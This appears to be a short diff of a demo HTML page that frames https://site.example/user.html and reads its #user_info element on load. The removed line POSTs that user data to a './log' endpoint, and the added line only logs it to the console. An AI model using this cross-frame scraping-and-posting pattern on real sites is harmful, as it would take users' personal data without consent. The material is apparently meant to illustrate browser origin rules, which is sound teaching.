@@ -5,7 +5,7 @@
     <script>
       function load() {
         const userInfo = frm.document.querySelector("#user_info");
-        fetch("./log", { method: "POST", body: userInfo.textContent });
+        console.log(userInfo.textContent);
       }
     </script>
   </head>
@@ -13,6 +13,6 @@
   <body>
     <div></div>
 
-    <iframe name="frm" onload="load()" src="https://site.example/user.html">
+    <iframe name="frm" onload="load()" src="https://site.example/user.html" width="80%">
   </body>
 </html>
